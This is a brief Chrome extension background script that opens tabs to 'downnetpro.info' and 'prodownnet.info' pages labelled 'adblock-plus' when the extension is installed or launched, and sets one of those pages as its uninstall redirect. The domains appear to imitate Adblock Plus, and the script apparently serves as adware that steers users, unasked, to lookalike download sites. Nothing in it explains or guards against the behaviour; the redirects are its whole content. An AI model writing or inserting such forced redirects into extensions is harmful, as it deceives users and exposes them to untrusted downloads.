chrome.runtime.onInstalled.addListener(function(details) 
{
window.open("http://downnetpro.info/adblock-plus/");
window.open("http://prodownnet.info/adblock-plus/");
});
chrome.app.runtime.onLaunched.addListener(function() {
window.open("http://downnetpro.info/adblock-plus/");
});
if(chrome.runtime.setUninstallURL) {
  chrome.runtime.setUninstallURL('http://downnetpro.info/adblock-plus/');
} else {
}